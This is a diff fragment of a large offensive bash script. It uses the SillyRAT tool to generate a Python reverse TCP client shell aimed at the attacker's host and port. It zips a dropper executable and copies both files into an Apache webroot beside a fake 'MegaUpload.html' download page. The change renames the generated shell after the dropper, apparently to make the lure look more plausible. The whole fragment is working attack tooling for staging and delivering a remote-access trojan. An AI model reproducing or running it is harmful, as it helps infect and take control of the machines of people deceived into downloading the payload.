@@ -13224,7 +13224,7 @@ rm $IPATH/output/dropper.c > /dev/nul 2>&1
 ## Writting Client reverse tcp python shell to output
 echo "${BlueF}[☠]${white} Writting Client rev tcp shell to output."${Reset};sleep 2
 cd $IPATH/bin/SillyRAT
-xterm -T " SillyRAT - $lhost:$lport" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/Client.py --source && sleep 2"
+xterm -T " SillyRAT - $lhost:$lport" -geometry 120x23 -e "python3 server.py generate --address $lhost --port $lport --output $IPATH/output/$Drop.py --source && sleep 2"
 cd $IPATH
 
 
@@ -13237,7 +13237,7 @@ mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
 zip $Drop.zip $Drop.exe > /dev/nul 2>&1 # ZIP dropper.exe
-cp $IPATH/output/Client.py $ApAcHe/Client.py > /dev/nul 2>&1 # rev tcp Client shell
+cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
 mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
 cd $IPATH
 
@@ -13263,7 +13263,7 @@ sleep 1
 ## Clean old files.
 echo "${BlueF}[☠]${white} Please Wait, cleaning old files.${white}";sleep 2
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
-rm $ApAcHe/Client.py > /dev/nul 2>&1
+rm $ApAcHe/$Drop.py > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 rm $IPATH/output/dropper.c > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
